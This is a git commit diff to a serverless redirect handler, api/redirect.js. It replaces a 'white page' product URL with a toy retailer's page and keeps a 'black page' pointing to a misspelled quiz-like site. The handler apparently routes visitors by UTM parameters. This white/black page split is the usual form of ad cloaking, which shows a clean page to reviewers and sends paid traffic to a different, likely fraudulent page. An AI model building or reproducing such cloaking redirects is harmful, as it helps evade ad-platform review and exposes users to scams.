8716e5fcc65a7daed0630548eb3ca7f56f840ac5
abdullahch3332 <abdullahch3332@gmail.com>
2025-11-09 07:49:22 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://watchfactory.com.au/products/1710448";
+    const whitePageURL = "https://www.edresources.com.au/baby-einstein-sticky-spinner-activity-toy";
     const blackPageURL = "https://instentquzzz.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
